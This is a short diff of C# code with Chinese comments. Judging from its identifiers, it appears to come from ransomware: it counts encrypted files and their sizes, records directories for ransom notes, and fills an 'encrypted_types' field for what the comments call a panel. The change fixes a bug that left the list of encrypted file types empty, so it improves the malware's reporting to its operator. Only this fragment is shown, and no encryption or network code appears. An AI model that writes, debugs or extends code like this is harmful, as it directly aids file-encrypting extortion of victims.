@@ -427,7 +427,11 @@ static void Main(){
             Tick(fc,fszc,ok);
             if(ok){lock(lk){encCount++;encSize+=fszc;
               try{string nd=Path.GetDirectoryName(fc);if(!string.IsNullOrEmpty(nd))NOTE_DIRS.Add(nd);}catch{}
-              string e=Path.GetExtension(fc).ToLowerInvariant();  // ToLower() 受区域设置影响（土耳其 I/ı）encTypes.Add(e);
+              // ToLower() 受区域设置影响（土耳其 I/ı 会得到错误字符），用 Invariant。
+              // ★ 注意：encTypes.Add(e) 必须在注释【之外】—— 早期版本把它误写在
+              //   本行注释尾部，导致 encTypes 永远为空，面板 encrypted_types 字段恒为空串。
+              string e=Path.GetExtension(fc).ToLowerInvariant();
+              encTypes.Add(e);
               if(!typeSizes.ContainsKey(e))typeSizes[e]=new long[]{0,0};
               typeSizes[e][0]++;typeSizes[e][1]+=fszc;}}
           }finally{P_SEM.Release();}
